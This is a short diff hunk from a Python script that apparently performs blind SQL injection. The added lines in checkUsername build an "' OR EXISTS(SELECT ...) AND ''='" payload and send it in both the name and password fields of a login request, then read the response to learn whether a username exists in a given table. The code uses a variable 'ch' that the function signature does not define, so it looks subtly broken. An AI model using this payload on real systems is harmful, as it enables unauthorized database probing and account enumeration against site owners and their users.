@@ -311,7 +311,12 @@ def checkUsername(username, url, tableName):
 """
 
 """
-
+   payload = "' OR EXISTS(SELECT * FROM " + tableName + " WHERE "
+   payload += "name = '" + ch + "') AND ''='"
+   payload = {"name" : payload, "password" : payload}
+   txt = sendQuery(payload, url)
+   mhm = readQuery(txt)
+   return mhm
 
 def userNameLike(ch, url, tableName, notLike = False, notLikeName = ""):
    """
